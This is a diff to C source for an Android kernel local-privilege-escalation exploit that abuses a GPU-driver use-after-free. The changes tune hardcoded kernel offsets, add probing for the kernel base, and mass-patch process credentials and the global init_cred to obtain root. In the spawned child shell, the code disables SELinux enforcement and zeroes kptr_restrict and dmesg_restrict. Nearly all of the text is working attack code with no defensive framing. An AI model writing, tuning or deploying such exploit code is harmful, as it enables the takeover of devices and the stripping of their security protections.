@@ -24,15 +24,15 @@
 
 // ==================== РЕАЛЬНЫЕ СМЕЩЕНИЯ ДЛЯ ВАШЕГО ЯДРА ====================
 // Updated with Batch Spray and Fast Scan optimizations
-#define KERNEL_BASE          0xffffffa000000000ULL
-#define SELINUX_OFFSET       0x02f74ce8ULL
+#define KERNEL_BASE          0xffffffc000000000ULL
+#define SELINUX_OFFSET       0x02caa000ULL
 #define INIT_CRED_OFFSET     0x018f9038ULL
 
 #define OFFSET_PID           0x650
 #define OFFSET_TGID          0x658
 #define OFFSET_COMM          0x818
-#define OFFSET_REAL_CRED     0x848
-#define OFFSET_CRED          0x850
+#define OFFSET_REAL_CRED     0x868
+#define OFFSET_CRED          0x870
 #define OFFSET_TASKS         0x3f0
 #define OFFSET_FLAGS         0x00
 #define OFFSET_STACK         0x08
@@ -1211,17 +1211,17 @@ static int patch_cred_via_gpu(int fd, uint64_t cred_ptr, uint64_t real_cred_ptr)
 static int mass_patch_creds(int fd, uint32_t target_uid) {
     fprintf(stderr, "[PARENT] --- STARTING MASS CRED PATCH (Target UID: %u) ---\n", target_uid);
     int patch_count = 0;
-    int max_patches = 200; // Снижено с 300
+    int max_patches = 100; // Further reduced for stability
     uint8_t *page = malloc(PAGE_SIZE);
     
     // Scan all pages in the UAF range
     for (uint64_t va = UAF_START; va < UAF_START + UAF_SIZE; va += PAGE_SIZE) {
         // Stability check: RAM usage during mass patch
-        if (patch_count % 50 == 0) { // Проверяем чаще
+        if (patch_count % 20 == 0) { 
             double ram = get_ram_usage_percentage();
-            if (ram > 80.0) { // Порог ниже
+            if (ram > 70.0) { // User requested limit 70%
                 fprintf(stderr, "[PARENT] Mass patch throttling: RAM at %.1f%%. Resting...\n", ram);
-                usleep(800000); // Отдыхаем дольше
+                usleep(1500000); 
             }
         }
 
@@ -1268,37 +1268,35 @@ static int parent_patch_root(int fd, uint64_t cred_ptr) {
     // 1. Resolve Kernel Base - Prioritize verified KERNEL_BASE
     if (kernel_base == 0) {
         uint8_t elf_magic[4];
-        // Try 'a' prefix (observed in latest log)
-        uint64_t base_a = 0xffffffa000000000ULL;
-        if (gpu_read_task_struct(fd, base_a, elf_magic, 4) == 0 && 
-            elf_magic[0] == 0x7f && elf_magic[1] == 'E' && elf_magic[2] == 'L' && elf_magic[3] == 'F') {
-            kernel_base = base_a;
-            fprintf(stderr, "[PARENT] Verified KERNEL_BASE (a-prefix) confirmed: 0x%lx\n", (unsigned long)kernel_base);
-        } else {
-            // Try 'af' prefix
-            uint64_t base_af = 0xffffffaf20000000ULL;
-            if (gpu_read_task_struct(fd, base_af, elf_magic, 4) == 0 && 
+        uint64_t bases_to_check[] = {
+            0xffffffc000000000ULL, // C-prefix (New ROG 5S)
+            0xffffffb000000000ULL, // B-prefix
+            0xffffffa000000000ULL, // A-prefix
+            0xffffffaf20000000ULL, // AF-prefix
+            0xffffff94d0000000ULL,
+            0xffffff8008000000ULL  // Legacy
+        };
+
+        for (int i = 0; i < 6; i++) {
+            if (gpu_read_task_struct(fd, bases_to_check[i], elf_magic, 4) == 0 && 
                 elf_magic[0] == 0x7f && elf_magic[1] == 'E' && elf_magic[2] == 'L' && elf_magic[3] == 'F') {
-                kernel_base = base_af;
-                fprintf(stderr, "[PARENT] Verified KERNEL_BASE (af-prefix) confirmed: 0x%lx\n", (unsigned long)kernel_base);
-            } else {
-                // Try 'b' prefix
-                uint64_t base_b = 0xffffffb000000000ULL;
-                if (gpu_read_task_struct(fd, base_b, elf_magic, 4) == 0 && 
-                    elf_magic[0] == 0x7f && elf_magic[1] == 'E' && elf_magic[2] == 'L' && elf_magic[3] == 'F') {
-                    kernel_base = base_b;
-                    fprintf(stderr, "[PARENT] Verified KERNEL_BASE (b-prefix) confirmed: 0x%lx\n", (unsigned long)kernel_base);
-                }
+                kernel_base = bases_to_check[i];
+                fprintf(stderr, "[PARENT] Verified KERNEL_BASE (0x%lx) confirmed!\n", (unsigned long)kernel_base);
+                break;
             }
         }
         
         if (kernel_base == 0) {
-            fprintf(stderr, "[PARENT] KERNEL_BASE mismatch, searching dynamically...\n");
+            fprintf(stderr, "[PARENT] KERNEL_BASE mismatch, falling back to dynamic discovery...\n");
             if (task_va != 0) {
                 kernel_base = find_kernel_base_from_task_va(task_va);
             }
             if (kernel_base == 0) {
                 kernel_base = find_kernel_base_auto();
+            }
+            if (kernel_base == 0) {
+                fprintf(stderr, "[PARENT] Dynamic discovery failed. Using hardcoded fallback 0xffffffc000000000...\n");
+                kernel_base = 0xffffffc000000000ULL;
             }
         }
     }
@@ -1326,6 +1324,15 @@ static int parent_patch_root(int fd, uint64_t cred_ptr) {
         uint64_t init_cred_va = kernel_base + INIT_CRED_OFFSET;
         fprintf(stderr, "[PARENT] Patching global init_cred at 0x%lx...\n", (unsigned long)init_cred_va);
         patch_cred_via_gpu(fd, init_cred_va, 0);
+        
+        // Verification
+        uint32_t verify_cred[2];
+        if (gpu_read_task_struct(fd, init_cred_va, (uint8_t *)verify_cred, 8) == 0) {
+            fprintf(stderr, "[PARENT] init_cred verification: usage=%u, uid=%u\n", verify_cred[0], verify_cred[1]);
+            if (verify_cred[1] == 0) {
+                fprintf(stderr, "[PARENT] [+++] GLOBAL ROOT CONFIRMED via init_cred patch!\n");
+            }
+        }
 #endif
     } else {
         fprintf(stderr, "[PARENT] [!] KERNEL_BASE is 0. Attempting blind patching of fixed offsets...\n");
@@ -1435,16 +1442,17 @@ shell:
     // Try to run id command via system first to show user
     system("id");
     
-    // NEW: Attempt to disable SELinux from child if we have root but it's still Enforcing
-    fprintf(stderr, "[CHILD %d] Checking SELinux status...\n", getpid());
-    system("getenforce");
-    fprintf(stderr, "[CHILD %d] Attempting to disable SELinux (setenforce 0)...\n", getpid());
+    // NEW: Attempt to disable SELinux and other protections from child if we have root
+    fprintf(stderr, "[CHILD %d] Disabling Kernel Protections...\n", getpid());
     system("setenforce 0 2>/dev/null");
-    // Also try to write directly to the sysfs if available
     system("echo 0 > /sys/fs/selinux/enforce 2>/dev/null");
+    system("echo 0 > /proc/sys/kernel/kptr_restrict 2>/dev/null");
+    system("echo 0 > /proc/sys/kernel/dmesg_restrict 2>/dev/null");
+    system("setprop selinux.reload_policy 1 2>/dev/null");
     system("getenforce");
 
     // Try to escalate privileges via syscalls again just in case
+    prctl(PR_SET_KEEPCAPS, 1, 0, 0, 0);
     setresuid(0, 0, 0);
     setresgid(0, 0, 0);
 
@@ -1846,9 +1854,9 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
         if (current_va >= end_va) current_va = UAF_START;
 
         double current_ram = get_ram_usage_percentage();
-        if (current_ram > 85.0) { // Снизили порог до 85%
+        if (current_ram > 70.0) { // Throttling at 70% RAM
             fprintf(stderr, "\n[!] SCAN THROTTLING: RAM at %.1f%%. Cooling down...\n", current_ram);
-            usleep(1500000); 
+            usleep(2000000); 
             continue; 
         }
 
